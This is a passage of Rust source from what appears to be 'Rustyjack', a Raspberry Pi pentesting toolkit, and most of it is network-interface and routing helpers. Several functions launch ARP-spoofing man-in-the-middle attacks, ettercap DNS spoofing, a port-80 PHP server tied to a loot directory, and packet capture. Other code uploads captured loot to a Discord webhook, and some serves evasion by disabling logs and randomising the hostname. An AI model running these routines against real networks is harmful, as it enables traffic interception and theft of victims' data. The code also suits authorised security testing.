//! # Rustyjack Core System Module
//!
//! This module provides core system functionality for network operations, WiFi management,
//! and system integration.
//!
//! ## Security Notes
//!
//! ### WiFi Password Storage
//! **IMPORTANT**: WiFi passwords are currently stored as **PLAINTEXT** in JSON profile files
//! located at `<root>/wifi/profiles/*.json`. This is intentional for this pentesting tool
//! but presents a security risk. Ensure proper file permissions are set:
//!
//! ```bash
//! chmod 600 <root>/wifi/profiles/*.json
//! chmod 700 <root>/wifi/profiles/
//! ```
//!
//! The tool is designed to run as root on a Raspberry Pi Zero W 2 and assumes physical
//! security of the device. For production use, consider implementing:
//! - Encrypted password storage using `keyring` or `secret-service`
//! - Hardware-backed encryption via TPM
//! - Kernel keyring integration
//!
//! ### Permission Requirements
//! All network operations require root privileges (UID 0). Operations will fail with
//! explicit error messages if not run as root.

use std::{
    env, fs,
    net::Ipv4Addr,
    path::{Path, PathBuf},
    process::{Command, Stdio},
    time::{Duration, SystemTime, UNIX_EPOCH},
};

#[cfg(unix)]
use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

use anyhow::{anyhow, bail, Context, Result};
use chrono::Local;
use log::debug;
use regex::Regex;
use reqwest::blocking::{multipart, Client};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};
use zeroize::Zeroize;

use rustyjack_netlink::wireless::{InterfaceMode, WirelessManager};
use rustyjack_netlink::{StationConfig, StationManager};

use crate::netlink_helpers::{
    netlink_set_interface_down, netlink_set_interface_up, process_kill_pattern, process_running,
    rfkill_block, rfkill_find_index, rfkill_unblock,
};

#[derive(Debug, Clone, Serialize)]
pub struct InterfaceInfo {
    pub name: String,
    pub address: Ipv4Addr,
    pub prefix: u8,
}

impl InterfaceInfo {
    pub fn network_cidr(&self) -> String {
        let prefix = self.prefix.min(32);
        let mask = if prefix == 0 {
            0
        } else {
            let shift = 32 - prefix as u32;
            u32::MAX.checked_shl(shift).unwrap_or(0)
        };
        let addr = u32::from(self.address);
        let network = addr & mask;
        format!("{}/{}", Ipv4Addr::from(network), prefix)
    }
}

#[derive(Debug, Clone)]
pub struct HostInfo {
    pub ip: Ipv4Addr,
}

#[derive(Debug, Clone, Serialize)]
pub struct InterfaceStats {
    pub rx_bytes: u64,
    pub tx_bytes: u64,
    pub oper_state: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InterfaceSummary {
    pub name: String,
    pub kind: String,
    pub oper_state: String,
    pub ip: Option<String>,
}

#[derive(Debug, Clone, Serialize, Default)]
pub struct WifiLinkInfo {
    pub connected: bool,
    pub ssid: Option<String>,
    pub signal_dbm: Option<i32>,
    pub tx_bitrate: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct WifiNetwork {
    pub ssid: Option<String>,
    pub bssid: Option<String>,
    pub quality: Option<String>,
    pub signal_dbm: Option<i32>,
    pub channel: Option<u8>,
    pub encrypted: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiProfile {
    pub ssid: String,
    #[serde(default)]
    pub password: Option<String>,
    #[serde(default = "default_wifi_interface")]
    pub interface: String,
    #[serde(default)]
    pub priority: i32,
    #[serde(default = "default_true")]
    pub auto_connect: bool,
    #[serde(default)]
    pub created: Option<String>,
    #[serde(default)]
    pub last_used: Option<String>,
    #[serde(default)]
    pub notes: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct WifiProfileRecord {
    pub ssid: String,
    pub interface: String,
    pub priority: i32,
    pub auto_connect: bool,
    pub filename: String,
    pub last_used: Option<String>,
    pub created: Option<String>,
}

#[derive(Debug, Clone)]
pub struct StoredWifiProfile {
    pub profile: WifiProfile,
    pub path: PathBuf,
}

fn default_wifi_interface() -> String {
    "auto".to_string()
}

fn default_true() -> bool {
    true
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DefaultRouteInfo {
    pub interface: Option<String>,
    pub gateway: Option<Ipv4Addr>,
    pub metric: Option<u32>,
}

pub enum KillResult {
    Terminated,
    NotFound,
}

pub fn resolve_root(input: Option<PathBuf>) -> Result<PathBuf> {
    if let Some(path) = input {
        return Ok(path);
    }

    if let Ok(env_path) = env::var("RUSTYJACK_ROOT") {
        return Ok(PathBuf::from(env_path));
    }

    let default = PathBuf::from("/root/Rustyjack");
    if default.exists() {
        return Ok(default);
    }

    env::current_dir().context("determining current directory")
}

pub fn detect_interface(override_name: Option<String>) -> Result<InterfaceInfo> {
    let name = match override_name {
        Some(name) => name,
        None => discover_default_interface().context("could not detect a default interface")?,
    };

    let output = Command::new("ip")
        .args(["-4", "addr", "show", "dev", &name])
        .output()
        .with_context(|| format!("collecting IPv4 data for {name}"))?;
    if !output.status.success() {
        bail!("ip command failed for interface {name}");
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let (addr, prefix) = parse_inet_line(&stdout)
        .with_context(|| format!("unable to parse IPv4 details for {name}"))?;

    Ok(InterfaceInfo {
        name,
        address: addr,
        prefix,
    })
}

/// Detect an Ethernet interface (eth*/en*) and fail if none are present.
pub fn detect_ethernet_interface(override_name: Option<String>) -> Result<InterfaceInfo> {
    let summaries = list_interface_summaries().context("listing interfaces")?;

    // Helper to validate a wired, Ethernet-style name
    let is_eth = |s: &InterfaceSummary| {
        s.kind == "wired" && (s.name.starts_with("eth") || s.name.starts_with("en"))
    };

    if let Some(name) = override_name {
        let summary = summaries
            .iter()
            .find(|s| s.name == name)
            .ok_or_else(|| anyhow!("interface {} not found", name))?;

        if !is_eth(summary) {
            bail!(
                "interface {} is not an Ethernet port (expected eth*/en*)",
                name
            );
        }

        return detect_interface(Some(name));
    }

    // Prefer: up + has IP -> has IP -> up -> any eth*/en*
    if let Some(summary) = summaries
        .iter()
        .find(|s| is_eth(s) && s.oper_state == "up" && s.ip.is_some())
    {
        return detect_interface(Some(summary.name.clone()));
    }
    if let Some(summary) = summaries.iter().find(|s| is_eth(s) && s.ip.is_some()) {
        return detect_interface(Some(summary.name.clone()));
    }
    if let Some(summary) = summaries.iter().find(|s| is_eth(s) && s.oper_state == "up") {
        return detect_interface(Some(summary.name.clone()));
    }
    if let Some(summary) = summaries.iter().find(|s| is_eth(s)) {
        return detect_interface(Some(summary.name.clone()));
    }

    bail!("No Ethernet interfaces detected (need eth*/en*)");
}

pub fn discover_default_interface() -> Result<String> {
    let output = Command::new("ip")
        .args(["-4", "route", "show", "default"])
        .output()
        .context("executing ip route")?;

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if let Some(name) = parse_default_route(&stdout) {
            return Ok(name);
        }
    }

    let entries = fs::read_dir("/sys/class/net").context("listing network interfaces")?;
    for entry in entries {
        let entry = entry?;
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name != "lo" {
            return Ok(name.into());
        }
    }

    Err(anyhow!("no usable network interface found"))
}

fn parse_default_route(route_output: &str) -> Option<String> {
    for line in route_output.lines() {
        let mut words = line.split_whitespace().peekable();
        while let Some(word) = words.next() {
            if word == "dev" {
                return words.next().map(|s| s.to_string());
            }
        }
    }
    None
}

fn parse_inet_line(output: &str) -> Option<(Ipv4Addr, u8)> {
    for line in output.lines() {
        let line = line.trim();
        if line.starts_with("inet ") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(addr_part) = parts.get(1) {
                if let Some((addr, prefix)) = addr_part.split_once('/') {
                    let addr = addr.parse().ok()?;
                    let prefix = prefix.parse().ok()?;
                    return Some((addr, prefix));
                }
            }
        }
    }
    None
}

pub fn strip_nmap_header(path: &Path) -> Result<()> {
    let contents = fs::read_to_string(path).context("reading nmap output")?;
    let replaced = contents.replace("Nmap scan report for ", "");
    if replaced != contents {
        fs::write(path, replaced).context("writing sanitized nmap output")?;
    }
    Ok(())
}

pub fn build_loot_path(root: &Path, label: &str) -> Result<PathBuf> {
    let safe_label = sanitize_label(label);
    let timestamp = Local::now().format("%Y-%m-%d_%H-%M-%S");
    let relative = format!("loot/Nmap/{}_{}.txt", safe_label, timestamp);
    Ok(root.join(relative))
}

pub fn read_discord_webhook(root: &Path) -> Result<Option<String>> {
    let path = root.join("discord_webhook.txt");
    if !path.exists() {
        return Ok(None);
    }
    let value = fs::read_to_string(path).context("reading discord_webhook.txt")?;
    let value = value.trim();
    if value.starts_with("https://discord.com/api/webhooks/") && !value.is_empty() {
        Ok(Some(value.to_string()))
    } else {
        Ok(None)
    }
}

pub fn send_scan_to_discord(
    root: &Path,
    label: &str,
    loot_path: &Path,
    target: &str,
    interface: &str,
) -> Result<bool> {
    let metadata = fs::metadata(loot_path)
        .with_context(|| format!("cannot read loot metadata at {}", loot_path.display()))?;
    if metadata.len() == 0 {
        debug!("Loot file is empty, skipping Discord notification");
        return Ok(false);
    }

    let filename = loot_path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("scan.txt");
    let description = format!(
        "**Target Network:** `{}`\n**Interface:** `{}`\n**Timestamp:** {}",
        target,
        interface,
        Local::now().format("%Y-%m-%d %H:%M:%S")
    );
    let embed = json!({
        "title": format!("Nmap Scan Complete: {label}"),
        "description": description,
        "color": 0x00ff00,
        "fields": [{
            "name": "Scan Results",
            "value": format!(
                "**File:** `{}`\n**Size:** {} bytes\nDownload the attached file for full details",
                filename,
                metadata.len()
            )
        }],
        "footer": {
            "text": "Rustyjack Nmap Scanner"
        },
        "timestamp": Local::now().to_rfc3339(),
    });

    send_discord_payload(root, Some(embed), Some(loot_path), None)
}

pub fn build_manual_embed(title: &str, target: Option<&str>, interface: Option<&str>) -> Value {
    let mut description = String::new();
    if let Some(target) = target {
        description.push_str(&format!("**Target:** `{}`\n", target));
    }
    if let Some(interface) = interface {
        description.push_str(&format!("**Interface:** `{}`\n", interface));
    }
    let mut embed = serde_json::Map::new();
    embed.insert("title".into(), Value::String(title.to_string()));
    if !description.is_empty() {
        embed.insert(
            "description".into(),
            Value::String(description.trim().to_string()),
        );
    }
    embed.insert("timestamp".into(), Value::String(Local::now().to_rfc3339()));
    Value::Object(embed)
}

pub fn send_discord_payload(
    root: &Path,
    embed: Option<Value>,
    file: Option<&Path>,
    content: Option<&str>,
) -> Result<bool> {
    let Some(webhook) = read_discord_webhook(root)? else {
        return Ok(false);
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .context("building HTTP client")?;

    let mut payload = serde_json::Map::new();
    if let Some(text) = content {
        if !text.is_empty() {
            payload.insert("content".into(), Value::String(text.to_string()));
        }
    }
    if let Some(embed_value) = embed {
        payload.insert("embeds".into(), json!([embed_value]));
    }
    if payload.is_empty() {
        bail!("Discord payload must include at least a message or embed content");
    }
    let payload_value = Value::Object(payload);

    if let Some(file_path) = file {
        let form = multipart::Form::new()
            .text("payload_json", payload_value.to_string())
            .file("file", file_path)
            .with_context(|| format!("attaching file {}", file_path.display()))?;
        let response = client
            .post(&webhook)
            .multipart(form)
            .send()
            .context("sending Discord webhook with file")?;
        if !response.status().is_success() {
            bail!("Discord webhook returned status {}", response.status());
        }
    } else {
        let response = client
            .post(&webhook)
            .json(&payload_value)
            .send()
            .context("sending Discord webhook")?;
        if !response.status().is_success() {
            bail!("Discord webhook returned status {}", response.status());
        }
    }

    Ok(true)
}

pub fn kill_process(name: &str) -> Result<KillResult> {
    #[cfg(target_os = "linux")]
    {
        use rustyjack_netlink::process;
        match process::pkill_exact_force(name) {
            Ok(n) if n > 0 => Ok(KillResult::Terminated),
            Ok(_) => Ok(KillResult::NotFound),
            Err(e) => bail!("Failed to kill process {}: {}", name, e),
        }
    }

    #[cfg(not(target_os = "linux"))]
    {
        let status = Command::new("pkill")
            .args(["-9", "-x", name])
            .status()
            .with_context(|| format!("terminating process {name}"))?;
        if status.success() {
            Ok(KillResult::Terminated)
        } else if status.code() == Some(1) {
            Ok(KillResult::NotFound)
        } else {
            bail!("pkill returned status {status}", status = status);
        }
    }
}

pub fn kill_process_pattern(pattern: &str) -> Result<KillResult> {
    match process_kill_pattern(pattern) {
        Ok(n) if n > 0 => Ok(KillResult::Terminated),
        Ok(_) => Ok(KillResult::NotFound),
        Err(e) => bail!("Failed to kill processes matching {}: {}", pattern, e),
    }
}

pub fn process_running_exact(name: &str) -> Result<bool> {
    #[cfg(target_os = "linux")]
    {
        use rustyjack_netlink::process;
        process::ProcessManager::new()
            .exists_name(name)
            .with_context(|| format!("checking for process {name}"))
    }

    #[cfg(not(target_os = "linux"))]
    {
        let status = Command::new("pgrep")
            .args(["-x", name])
            .status()
            .with_context(|| format!("checking for process {name}"))?;
        Ok(status.success())
    }
}

pub fn process_running_pattern(pattern: &str) -> Result<bool> {
    process_running(pattern).with_context(|| format!("checking for pattern {pattern}"))
}

pub fn compose_status_text(
    scan_running: bool,
    mitm_running: bool,
    dnsspoof_running: bool,
    responder_running: bool,
) -> String {
    let mut parts = Vec::new();

    if scan_running {
        parts.push("Scan");
    }
    if mitm_running {
        parts.push("MITM");
    }
    if dnsspoof_running {
        parts.push("DNS");
    }
    if responder_running {
        parts.push("Responder");
    }

    if parts.is_empty() {
        String::new()
    } else {
        format!("({})", parts.join("+"))
    }
}

pub fn default_gateway_ip() -> Result<Ipv4Addr> {
    let output = Command::new("ip")
        .args(["route", "show", "default"])
        .output()
        .context("executing ip route for gateway info")?;
    if !output.status.success() {
        bail!("ip route command failed when retrieving gateway");
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_gateway(&stdout).ok_or_else(|| anyhow!("unable to parse default gateway"))
}

fn parse_gateway(route_output: &str) -> Option<Ipv4Addr> {
    for line in route_output.lines() {
        let mut words = line.split_whitespace();
        while let Some(word) = words.next() {
            if word == "via" {
                if let Some(value) = words.next() {
                    if let Ok(ip) = value.parse() {
                        return Some(ip);
                    }
                }
            }
        }
    }
    None
}

pub fn scan_local_hosts(interface: &str) -> Result<Vec<HostInfo>> {
    let output = Command::new("arp-scan")
        .args(["--interface", interface, "--localnet", "--quiet"])
        .output()
        .with_context(|| format!("running arp-scan on {interface}"))?;
    if !output.status.success() {
        bail!("arp-scan exited with status {}", output.status);
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut hosts = Vec::new();
    for line in stdout.lines() {
        let mut parts = line.split_whitespace();
        if let (Some(ip_txt), Some(_mac)) = (parts.next(), parts.next()) {
            if let Ok(ip) = ip_txt.parse() {
                hosts.push(HostInfo { ip });
            }
        }
    }
    Ok(hosts)
}

pub fn spawn_arpspoof_pair(interface: &str, gateway: Ipv4Addr, host: &HostInfo) -> Result<()> {
    let gateway_str = gateway.to_string();
    let host_str = host.ip.to_string();

    let mut first = Command::new("arpspoof");
    first
        .args(["-i", interface, "-t", &gateway_str, &host_str])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .stdin(Stdio::null());
    first.spawn().with_context(|| {
        format!(
            "launching arpspoof against host {} from gateway {}",
            host.ip, gateway
        )
    })?;

    let mut second = Command::new("arpspoof");
    second
        .args(["-i", interface, "-t", &host_str, &gateway_str])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .stdin(Stdio::null());
    second.spawn().with_context(|| {
        format!(
            "launching arpspoof against gateway {} from host {}",
            gateway, host.ip
        )
    })?;

    Ok(())
}

pub fn build_mitm_pcap_path(root: &Path, target: Option<&str>) -> Result<PathBuf> {
    let safe = sanitize_label(target.unwrap_or("MITM"));
    let dir = root.join("loot").join("Ethernet").join(safe);
    fs::create_dir_all(&dir).context("creating Ethernet MITM loot directory")?;
    let timestamp = Local::now().format("%Y-%m-%d_%H-%M-%S");
    Ok(dir.join(format!("mitm_{timestamp}.pcap")))
}

pub fn start_tcpdump_capture(interface: &str, path: &Path) -> Result<()> {
    let path_str = path.to_string_lossy().to_string();
    let mut cmd = Command::new("tcpdump");
    cmd.args(["-i", interface, "-w", &path_str])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .stdin(Stdio::null());
    cmd.spawn()
        .with_context(|| format!("launching tcpdump on {interface}"))?;
    Ok(())
}

pub fn enable_ip_forwarding(enabled: bool) -> Result<()> {
    let value = if enabled { "1\n" } else { "0\n" };
    fs::write("/proc/sys/net/ipv4/ip_forward", value)
        .context("writing to /proc/sys/net/ipv4/ip_forward")?;
    Ok(())
}

pub fn rewrite_ettercap_dns(ip: Ipv4Addr) -> Result<()> {
    let path = Path::new("/etc/ettercap/etter.dns");
    let contents = fs::read_to_string(path).context("reading etter.dns")?;
    let regex =
        Regex::new(r"\b\d{1,3}(?:\.\d{1,3}){3}\b").context("compiling IPv4 regex for etter.dns")?;
    let replacement = regex.replace_all(&contents, ip.to_string());
    fs::write(path, replacement.as_bytes()).context("writing updated etter.dns")?;
    Ok(())
}

pub fn start_php_server(site_dir: &Path, loot_dir: Option<&Path>) -> Result<()> {
    let mut cmd = Command::new("php");
    cmd.args(["-S", "0.0.0.0:80"])
        .current_dir(site_dir)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .stdin(Stdio::null());
    if let Some(dir) = loot_dir {
        cmd.env("RUSTYJACK_DNSSPOOF_LOOT", dir);
    }
    cmd.spawn()
        .with_context(|| format!("launching PHP server in {}", site_dir.display()))?;
    Ok(())
}

pub fn start_ettercap(interface: &str) -> Result<()> {
    let mut cmd = Command::new("ettercap");
    cmd.args([
        "-Tq",
        "-M",
        "arp:remote",
        "-P",
        "dns_spoof",
        "-i",
        interface,
    ])
    .stdout(Stdio::null())
    .stderr(Stdio::null())
    .stdin(Stdio::null());
    cmd.spawn()
        .with_context(|| format!("starting ettercap on {interface}"))?;
    Ok(())
}

pub fn ping_host(host: &str, timeout: Duration) -> Result<bool> {
    let seconds = timeout.as_secs().clamp(1, 30).to_string();
    let status = Command::new("ping")
        .args(["-c", "1", "-W", &seconds, host])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .with_context(|| format!("pinging {host}"))?;
    Ok(status.success())
}

pub fn read_dns_servers() -> Result<Vec<String>> {
    let contents = fs::read_to_string("/etc/resolv.conf").context("reading resolv.conf")?;
    let mut servers = Vec::new();
    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("nameserver") {
            let parts: Vec<&str> = trimmed.split_whitespace().collect();
            if let Some(server) = parts.get(1) {
                servers.push(server.to_string());
            }
        }
    }
    Ok(servers)
}

pub fn read_interface_stats(interface: &str) -> Result<InterfaceStats> {
    let base = PathBuf::from(format!("/sys/class/net/{interface}"));
    let rx = fs::read_to_string(base.join("statistics/rx_bytes"))
        .with_context(|| format!("reading rx_bytes for {interface}"))?
        .trim()
        .parse::<u64>()
        .unwrap_or(0);
    let tx = fs::read_to_string(base.join("statistics/tx_bytes"))
        .with_context(|| format!("reading tx_bytes for {interface}"))?
        .trim()
        .parse::<u64>()
        .unwrap_or(0);
    let oper_state = fs::read_to_string(base.join("operstate"))
        .unwrap_or_else(|_| "unknown".into())
        .trim()
        .to_string();

    Ok(InterfaceStats {
        rx_bytes: rx,
        tx_bytes: tx,
        oper_state,
    })
}

pub fn sanitize_label(label: &str) -> String {
    let mut safe = String::with_capacity(label.len());
    for ch in label.chars() {
        if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
            safe.push(ch);
        } else {
            safe.push('_');
        }
    }
    let trimmed = safe.trim_matches('_').to_string();
    if trimmed.is_empty() {
        "wired".to_string()
    } else {
        trimmed
    }
}

/// Randomize system hostname to a plausible, non-identifying value.
pub fn randomize_hostname() -> Result<String> {
    use std::process::id;

    let prefixes = ["android", "debian", "ubuntu", "raspi", "linux"];
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_else(|_| Duration::from_secs(0));
    let idx = (now.as_nanos() as usize + id() as usize) % prefixes.len();
    let suffix = format!("{:x}", now.as_nanos() ^ (id() as u128));
    let suffix_short = &suffix[..suffix.len().min(6)];
    let new_hostname = format!("{}-{}", prefixes[idx], suffix_short);

    // Try hostnamectl first; fall back to hostname
    let _ = Command::new("hostnamectl")
        .args(["set-hostname", &new_hostname])
        .status();
    let _ = Command::new("hostname").arg(&new_hostname).status();

    Ok(new_hostname)
}

pub fn current_mac(interface: &str) -> Option<String> {
    let path = PathBuf::from(format!("/sys/class/net/{interface}/address"));
    fs::read_to_string(path).ok().map(|s| s.trim().to_string())
}

pub fn log_mac_usage(root: &Path, interface: &str, context: &str, tag: Option<&str>) -> Result<()> {
    let mac = current_mac(interface).unwrap_or_else(|| "unknown".to_string());
    let log_dir = root.join("loot").join("reports");
    fs::create_dir_all(&log_dir).ok();
    let log_path = log_dir.join("mac_usage.log");
    let timestamp = Local::now().to_rfc3339();
    let record = json!({
        "ts": timestamp,
        "interface": interface,
        "mac": mac,
        "context": context,
        "tag": tag.unwrap_or("unknown"),
    });
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&log_path)
        .with_context(|| format!("opening mac usage log at {}", log_path.display()))?;
    use std::io::Write;
    writeln!(file, "{}", record.to_string())
        .with_context(|| format!("writing mac usage log at {}", log_path.display()))?;
    Ok(())
}

pub fn append_payload_log(root: &Path, entry: &str) -> Result<()> {
    if rustyjack_evasion::logs_disabled() {
        return Ok(());
    }
    let path = root.join("loot").join("payload.log");
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent).ok();
    }
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .with_context(|| format!("opening payload log at {}", path.display()))?;
    use std::io::Write;
    writeln!(file, "{entry}")
        .with_context(|| format!("writing payload log at {}", path.display()))?;
    Ok(())
}

pub fn list_interface_summaries() -> Result<Vec<InterfaceSummary>> {
    let mut summaries = Vec::new();
    for entry in fs::read_dir("/sys/class/net").context("listing interfaces")? {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().to_string();
        let kind = if entry.path().join("wireless").exists() {
            "wireless".to_string()
        } else {
            "wired".to_string()
        };
        let oper_state = fs::read_to_string(entry.path().join("operstate"))
            .unwrap_or_else(|_| "unknown".into())
            .trim()
            .to_string();
        let carrier = fs::read_to_string(entry.path().join("carrier"))
            .unwrap_or_else(|_| "0".into())
            .trim()
            .to_string();
        let ip = if oper_state == "up" && carrier == "1" {
            interface_ipv4(&name)
        } else {
            None
        };
        summaries.push(InterfaceSummary {
            name,
            kind,
            oper_state,
            ip,
        });
    }
    Ok(summaries)
}

fn interface_ipv4(interface: &str) -> Option<String> {
    let output = Command::new("ip")
        .args(["-4", "addr", "show", "dev", interface])
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        let line = line.trim();
        if line.starts_with("inet ") {
            if let Some(addr) = line.split_whitespace().nth(1) {
                return Some(addr.split('/').next().unwrap_or(addr).to_string());
            }
        }
    }
    None
}

pub fn read_default_route() -> Result<Option<DefaultRouteInfo>> {
    let output = Command::new("ip")
        .args(["route", "show", "default"])
        .output()
        .context("reading default route")?;
    if !output.status.success() {
        return Ok(None);
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    let line = stdout.lines().next().unwrap_or("").trim();
    if line.is_empty() {
        return Ok(None);
    }
    let parts: Vec<&str> = line.split_whitespace().collect();
    let mut route = DefaultRouteInfo {
        interface: None,
        gateway: None,
        metric: None,
    };
    let mut i = 0;
    while i < parts.len() {
        match parts[i] {
            "dev" if i + 1 < parts.len() => {
                route.interface = Some(parts[i + 1].to_string());
                i += 1;
            }
            "via" if i + 1 < parts.len() => {
                if let Ok(ip) = parts[i + 1].parse() {
                    route.gateway = Some(ip);
                }
                i += 1;
            }
            "metric" if i + 1 < parts.len() => {
                if let Ok(value) = parts[i + 1].parse() {
                    route.metric = Some(value);
                }
                i += 1;
            }
            _ => {}
        }
        i += 1;
    }
    Ok(Some(route))
}

pub fn interface_gateway(interface: &str) -> Result<Option<Ipv4Addr>> {
    let output = Command::new("ip")
        .args(["route", "show", "dev", interface])
        .output()
        .with_context(|| format!("querying route for {interface}"))?;
    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if let Some(ip) = parse_gateway_from_route(&stdout) {
            return Ok(Some(ip));
        }
    }
    let output = Command::new("ip")
        .args(["route", "show", "default", "dev", interface])
        .output()
        .with_context(|| format!("querying default route for {interface}"))?;
    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if let Some(ip) = parse_gateway_from_route(&stdout) {
            return Ok(Some(ip));
        }
    }
    Ok(None)
}

fn parse_gateway_from_route(output: &str) -> Option<Ipv4Addr> {
    for line in output.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        for i in 0..parts.len() {
            if parts[i] == "via" && i + 1 < parts.len() {
                if let Ok(ip) = parts[i + 1].parse() {
                    return Some(ip);
                }
            }
        }
    }
    None
}

pub fn rfkill_index_for_interface(interface: &str) -> Option<String> {
    let phy = Path::new("/sys/class/net").join(interface).join("phy80211");
    if !phy.exists() {
        return None;
    }
    let entries = fs::read_dir(phy).ok()?;
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with("rfkill") {
            return Some(name.trim_start_matches("rfkill").to_string());
        }
    }
    None
}

pub fn is_wireless_interface(interface: &str) -> bool {
    Path::new(&format!("/sys/class/net/{}/wireless", interface)).exists()
}

pub fn read_interface_mac(interface: &str) -> Option<String> {
    let path = format!("/sys/class/net/{}/address", interface);
    fs::read_to_string(&path)
        .ok()
        .map(|mac| mac.trim().to_lowercase())
}

pub fn find_interface_by_mac(mac: &str) -> Option<String> {
    let target = mac.trim().to_lowercase();
    if target.is_empty() {
        return None;
    }
    let entries = fs::read_dir("/sys/class/net").ok()?;
    for entry in entries.flatten() {
        let iface = entry.file_name().to_string_lossy().to_string();
        if iface == "lo" {
            continue;
        }
        let path = format!("/sys/class/net/{}/address", iface);
        if let Ok(val) = fs::read_to_string(&path) {
            if val.trim().to_lowercase() == target {
                return Some(iface);
            }
        }
    }
    None
}

pub fn apply_interface_isolation(allowed: &[String]) -> Result<()> {
    use std::collections::HashSet;

    let allowed_set: HashSet<String> = allowed
        .iter()
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string())
        .collect();

    if allowed_set.is_empty() {
        bail!("Cannot enforce isolation: no allowed interfaces provided");
    }

    let entries = fs::read_dir("/sys/class/net").context("reading /sys/class/net")?;
    let mut interfaces = Vec::new();
    let mut errors = Vec::new();

    for entry in entries {
        let entry = entry.context("iterating interfaces in /sys/class/net")?;
        let iface = entry.file_name().to_string_lossy().to_string();
        if iface == "lo" {
            continue;
        }
        let is_wireless = is_wireless_interface(&iface);
        interfaces.push((iface, is_wireless));
    }

    if !interfaces.iter().any(|(iface, _)| allowed_set.contains(iface)) {
        let allowed_list = allowed_set.iter().cloned().collect::<Vec<_>>().join(", ");
        bail!(
            "Cannot enforce isolation: none of the allowed interfaces exist ({})",
            allowed_list
        );
    }

    for (iface, is_wireless) in interfaces {
        let is_allowed = allowed_set.contains(&iface);

        if is_allowed {
            // For wireless: unblock rfkill BEFORE bringing interface up
            if is_wireless {
                if let Ok(Some(idx)) = rfkill_find_index(&iface) {
                    let _ = rfkill_unblock(idx);
                }
            }

            // Bring interface up (don't fail if wireless can't be brought up)
            let up_result = netlink_set_interface_up(&iface);

            if let Err(e) = up_result {
                // For wireless, this is expected if not associated with AP - not an error
                if !is_wireless {
                    errors.push(format!("{}: failed to bring up: {}", iface, e));
                }
            }
        } else {
            // Bring interface down
            let _ = netlink_set_interface_down(&iface);

            // For wireless: block with rfkill after bringing down
            if is_wireless {
                if let Ok(Some(idx)) = rfkill_find_index(&iface) {
                    let _ = rfkill_block(idx);
                }
            }
        }
    }

    // Only fail if we had errors on non-wireless interfaces
    if !errors.is_empty() {
        bail!("Interface isolation errors: {}", errors.join("; "));
    }

    Ok(())
}

pub fn enforce_single_interface(interface: &str) -> Result<()> {
    if interface.is_empty() {
        bail!("Cannot enforce isolation: no interface specified");
    }
    apply_interface_isolation(&[interface.to_string()])
}

pub fn set_default_route(interface: &str, gateway: Ipv4Addr) -> Result<()> {
    use std::net::IpAddr;

    #[cfg(target_os = "linux")]
    {
        let iface = interface.to_string();
        let gw = IpAddr::V4(gateway);

        tokio::runtime::Handle::try_current()
            .map(|handle| {
                handle.block_on(async {
                    let _ = rustyjack_netlink::delete_default_route().await;
                    rustyjack_netlink::add_default_route(gw, &iface)
                        .await
                        .map_err(|e| anyhow::anyhow!("Failed to set default route: {}", e))
                })
            })
            .unwrap_or_else(|_| {
                tokio::runtime::Runtime::new()?.block_on(async {
                    let _ = rustyjack_netlink::delete_default_route().await;
                    rustyjack_netlink::add_default_route(gw, &iface)
                        .await
                        .map_err(|e| anyhow::anyhow!("Failed to set default route: {}", e))
                })
            })
    }

    #[cfg(not(target_os = "linux"))]
    bail!("Route management only supported on Linux")
}

pub fn rewrite_dns_servers(interface: &str, gateway: Ipv4Addr) -> Result<()> {
    let content = format!(
        "# Managed by rustyjack-core for {interface}\n\
nameserver {gateway}\n\
nameserver 8.8.8.8\n\
nameserver 8.8.4.4\n"
    );
    fs::write("/etc/resolv.conf", content).context("writing /etc/resolv.conf")?;
    Ok(())
}

pub fn select_best_interface(root: &Path, prefer_wifi: bool) -> Result<Option<String>> {
    let summaries = list_interface_summaries()?;
    if summaries.is_empty() {
        return Ok(None);
    }

    if let Some(pref) = read_interface_preference(root, "system_preferred")? {
        if summaries.iter().any(|s| s.name == pref && s.ip.is_some()) {
            return Ok(Some(pref));
        }
    }

    if let Ok(default_route) = discover_default_interface() {
        if summaries
            .iter()
            .any(|s| s.name == default_route && s.ip.is_some())
        {
            return Ok(Some(default_route));
        }
    }

    if prefer_wifi {
        if let Some(wireless) = summaries
            .iter()
            .find(|s| s.kind == "wireless" && s.ip.is_some())
        {
            return Ok(Some(wireless.name.clone()));
        }
    }

    let priority = ["eth0", "wlan1", "wlan0"];
    for candidate in priority {
        if summaries
            .iter()
